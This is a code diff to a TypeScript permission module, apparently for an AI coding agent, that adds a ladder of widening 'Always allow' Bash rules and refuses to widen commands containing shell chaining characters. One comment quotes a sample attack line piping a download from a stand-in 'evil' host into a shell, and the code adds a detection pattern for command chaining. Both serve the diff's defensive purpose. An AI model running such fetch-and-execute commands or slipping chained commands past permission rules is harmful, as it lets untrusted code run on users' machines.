@@ -1,5 +1,5 @@
 import type { ResolvedSettings } from './settings.js';
-import type { ToolCall } from './types/tools.js';
+import type { PermissionDecision, PermissionResult, ToolCall } from './types/tools.js';
 import { canonicalToolName } from './tools/aliases.js';
 import { getPrimaryArg } from './tools/primary-arg.js';
 import { globToRegex } from './tools/glob-regex.js';
@@ -96,6 +96,69 @@ export function permissionRuleForToolCall(call: ToolCall): string {
     }
   }
   return primaryArg ? `${toolName}(${primaryArg})` : toolName;
+}
+
+/**
+ * Read an approver's answer, which may be a bare result or one naming a rule.
+ *
+ * Approvers that cannot widen a scope — the print-mode prompt, managed agents —
+ * keep returning the string, so only the surface that offers the choice has to
+ * know the richer shape exists.
+ */
+export function permissionResultOf(decision: PermissionResult | PermissionDecision) {
+  return typeof decision === 'string' ? decision : decision.result;
+}
+
+/** The rule an approver picked, or `undefined` to derive it from the call. */
+export function permissionRuleOf(
+  decision: PermissionResult | PermissionDecision,
+): string | undefined {
+  return typeof decision === 'string' ? undefined : decision.rule;
+}
+
+/** How many rules the "Always allow" scope ladder may offer, exact included. */
+const RULE_LADDER_MAX = 3;
+
+/**
+ * Shell characters that chain or redirect one command into another.
+ *
+ * A widened rule is a glob over the whole command string and `*` crosses
+ * anything, so `Bash(npm *)` would also match `npm x && curl evil | sh`. Book
+ * cannot express "and nothing else" in its glob language, so it declines to
+ * offer a widened rule when the command it learned from is already a compound
+ * one: the user would be generalizing from an example whose shape they cannot
+ * see repeated.
+ */
+const SHELL_CHAINING = /[;&|><`$(){}\n]/;
+
+/**
+ * Rules the "Always allow" button may write, narrowest first.
+ *
+ * The exact rule is always first and is what the button offers by default. For
+ * a shell command it is also nearly useless: `Bash(npm run check)` matches that
+ * byte sequence and nothing else, so a user who pressed "Always allow" to stop
+ * being asked was asked again on the very next call. The remaining entries drop
+ * one trailing token at a time — `npm run check` offers `npm run *` then
+ * `npm *` — and the caller must show the pattern it is about to write, because
+ * the difference between these is the whole decision.
+ *
+ * Only Bash gets a ladder. Paths are already reusable as written, and WebFetch
+ * globs its own origin in {@link permissionRuleForToolCall}.
+ */
+export function permissionRuleLadder(call: ToolCall): string[] {
+  const exact = permissionRuleForToolCall(call);
+  if (canonicalToolName(call.name) !== 'Bash') return [exact];
+
+  const command = getPrimaryArg(call.arguments).trim();
+  if (!command || SHELL_CHAINING.test(command)) return [exact];
+
+  const tokens = command.split(/\s+/);
+  const ladder = [exact];
+  for (let take = tokens.length - 1; take >= 1 && ladder.length < RULE_LADDER_MAX; take -= 1) {
+    const prefix = `Bash(${tokens.slice(0, take).join(' ')} *)`;
+    if (!ladder.includes(prefix)) ladder.push(prefix);
+  }
+  return ladder;
 }
 
 export function permissionRuleMatchesCall(rule: string, call: ToolCall): boolean {
